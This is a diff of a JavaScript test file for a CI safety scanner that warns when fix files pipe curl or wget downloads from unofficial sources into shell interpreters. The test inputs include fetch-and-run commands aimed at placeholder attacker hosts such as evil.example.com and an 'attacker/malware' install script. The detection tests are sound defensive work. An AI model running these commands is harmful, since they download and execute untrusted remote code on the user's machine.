@@ -62,12 +62,12 @@ describe('mission-safety-scan.mjs scanFileForSafetyIssues (CI observability)', (
 
   it('warns on curl piped to shell from a non-official source', () => {
     const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'curl https://evil.example.com/x | sh')
-    expect(warnings).toContain('curl piped to shell from non-standard source — verify URL is official')
+    expect(warnings).toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
   })
 
   it('does not warn on curl piped to shell from an allow-listed official source', () => {
     const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'curl https://get.k3s.io | sh')
-    expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
+    expect(warnings).not.toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
   })
 
   it('does not warn on curl piped to shell from allow-listed raw.githubusercontent.com orgs (#3392)', () => {
@@ -77,7 +77,7 @@ describe('mission-safety-scan.mjs scanFileForSafetyIssues (CI observability)', (
       'curl -sLS https://raw.githubusercontent.com/kube-burner/kube-burner/refs/heads/main/hack/install.sh | sh',
     ]) {
       const { warnings } = scanFileForSafetyIssues('fixes/x.json', url)
-      expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
+      expect(warnings).not.toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
     }
   })
 
@@ -86,7 +86,23 @@ describe('mission-safety-scan.mjs scanFileForSafetyIssues (CI observability)', (
       'fixes/x.json',
       'curl -fsSL https://raw.githubusercontent.com/attacker/malware/main/install.sh | bash',
     )
-    expect(warnings).toContain('curl piped to shell from non-standard source — verify URL is official')
+    expect(warnings).toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
+  })
+
+  it('warns on wget piped to shell from a non-official source (console-kb#3758)', () => {
+    const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'wget -qO- https://evil.example.com/x | bash')
+    expect(warnings).toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
+  })
+
+  it('warns on curl piped to a non-bash/sh interpreter (console-kb#3758)', () => {
+    for (const content of [
+      'curl https://evil.example.com/x | python3',
+      'curl https://evil.example.com/x | zsh',
+      'curl https://evil.example.com/x | pwsh',
+    ]) {
+      const { warnings } = scanFileForSafetyIssues('fixes/x.json', content)
+      expect(warnings).toContain('curl/wget piped to a shell interpreter from a non-standard source — verify URL is official')
+    }
   })
 
   it('warns on force delete with grace-period=0 (both overlapping checks fire)', () => {
